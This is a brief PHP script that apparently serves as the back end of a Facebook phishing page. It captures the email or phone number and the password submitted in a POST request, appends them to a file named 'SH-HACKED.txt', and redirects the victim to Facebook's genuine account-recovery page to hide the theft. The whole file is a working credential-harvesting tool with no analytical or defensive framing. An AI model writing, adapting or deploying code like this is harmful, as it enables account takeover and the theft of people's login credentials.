<?php
 
file_put_contents("SH-HACKED.txt", "Email/Number : " . $_POST['email'] . " | Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr');
exit();
 
